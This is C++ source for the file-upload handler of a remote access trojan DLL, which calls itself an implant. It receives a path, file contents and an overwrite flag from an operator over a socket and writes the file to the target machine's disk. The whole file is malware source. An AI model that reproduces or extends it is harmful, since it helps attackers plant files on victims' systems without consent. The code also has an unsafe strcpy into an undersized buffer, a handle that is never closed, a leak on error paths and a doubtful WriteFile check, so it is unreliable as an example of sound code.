// Patrick Sacchet
// Verison 1.0.
// RAT-Dll-PutFile.cpp : Defines functionality for performing a file put on target, i.e., placing a buffer with contents at a specified location on target disk

#include "RAT-Dll-Connect.h"
#include "RAT-Dll-PutFile.h"


/** Handles socket work and function calls for put file functionality 
params:
 * clientSock - current client socket connection to our implant 
return:
 * if successfulk we return SUCCESS; otherwise print the error code and handle appropiately
*/
INT handlePutFile(__in SOCKET clientSock)
{
    INT status = SUCCESS, recvBufLen = DEFAULT_BUF_LEN;
    CHAR recvBuf[DEFAULT_BUF_LEN], msgBuf[DEFAULT_BUF_LEN], filePathBuffer[DEFAULT_BUF_LEN];
    UINT64 fileBytesSize;
    BOOL overwrite;
    char* fileBytes = NULL;

    // Get the file path
    status = recv(clientSock, recvBuf, recvBufLen, 0);
    if (status == SOCKET_ERROR)
    {
        // TODO: have a function call to send back failure? Request a resend?
        sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Failed to recv (file path) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        goto cleanup; // keep trying to do things until we disconnect or receive a cleanup message
    }

    // Assign file path to separate buffer 
    strcpy(filePathBuffer, recvBuf);

    // We got the file path 
    sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Performing put file on path %s...\n", filePathBuffer);
    OutputDebugStringA(msgBuf);

    // Get the actual file bytes
    status = recv(clientSock, recvBuf, recvBufLen, 0);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Failed to recv (file bytes) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    fileBytesSize = strlen(recvBuf);
    sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Performing put file with %i bytes...\n", fileBytesSize);
    OutputDebugStringA(msgBuf);

    // Just a char buffer containing our bytes 
    fileBytes = (char*)malloc(sizeof(char) * fileBytesSize);
    if (fileBytes == NULL)
    {
        OutputDebugStringA("RAT-Dll::startListen - Failed to allocate space for fileBytes buffer! \n");
        status = FAILURE;
        goto cleanup;
    }

    strcpy(fileBytes, recvBuf);
    //sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Performing put file with bytes %s...\n", fileBytes);
    //OutputDebugStringA(msgBuf);

    // Get our overwrite value 
    status = recv(clientSock, recvBuf, recvBufLen, 0);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Failed to recv (overwrite) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    overwrite = *recvBuf;
    sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Put file overwrite value %i ...\n", overwrite);
    OutputDebugStringA(msgBuf);

    status = performPutFile(filePathBuffer, fileBytes, overwrite);
    if (status != SUCCESS)
    {
        sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Failure recevied from performPutFile %d\n", status);
        OutputDebugStringA(msgBuf);
        goto cleanup;
    }

    // Send back our success code 
    status = send(clientSock, "SUCCESS", 7, 0);
    if (status == SOCKET_ERROR)
    {
        sprintf_s(msgBuf, "RAT-Dll-PutFile::handlePutFile - Failure recevied from send (status code) %d\n", WSAGetLastError());
        OutputDebugStringA(msgBuf);
        status = WSAGetLastError();
        goto cleanup;
    }

    OutputDebugStringA("RAT-Dll-PutFile::handlePutFile - Successfully put file!\n");

    free(fileBytes);

    // If we made it this far we actually succeeded, but our response code is currently set to the number of bytes we sent...
    status = SUCCESS;

cleanup:
    return status;
}


/** This funciton will perform a simple put file for us 
params:
 * filePath - path to the file we're putting 
 * fileBytes - bytes we're writing to our file 
 * overwrite - whether or not to overwrite the file if its already there
return:
 * if successfulk we return SUCCESS; otherwise print the error code and handle appropiately 
*/
INT performPutFile(__in const char* filePath, __in const char* fileBytes, __in bool overwrite)
{
	INT status = SUCCESS;
	DWORD bytesWritten = 0, bytesToWrite = strlen(fileBytes);
	CHAR msgBuf[DEFAULT_BUF_LEN];
	HANDLE hFile;

	if (overwrite)
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Overwriting existing file!\n");

		hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)\n");
			status = FAILURE;
			goto cleanup;
		}
	}

	else
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Attempting to create new file...\n");

		hFile = CreateFileA(filePath, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hFile == INVALID_HANDLE_VALUE)
		{
			OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from CreateFileA (INVALID_HANDLE_VALUE)\n");
			status = FAILURE;
			goto cleanup;
		}
	}

	status = WriteFile(hFile, fileBytes, bytesToWrite, &bytesWritten, NULL);
	if (status != SUCCESS)
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failure from WriteFile!\n");
		status = FAILURE;
		goto cleanup;
	}

	if (bytesWritten != bytesToWrite)
	{
		OutputDebugStringA("RAT-Dll-PutFile::performPutFile - Failed to write total byte buffer!\n");
		status = FAILURE;
		goto cleanup;
	}


	sprintf_s(msgBuf, "RAT-Dll-PutFile::performPutFile - Wrote %i bytes to %s !\n", bytesWritten, filePath);


cleanup:
	return status;
}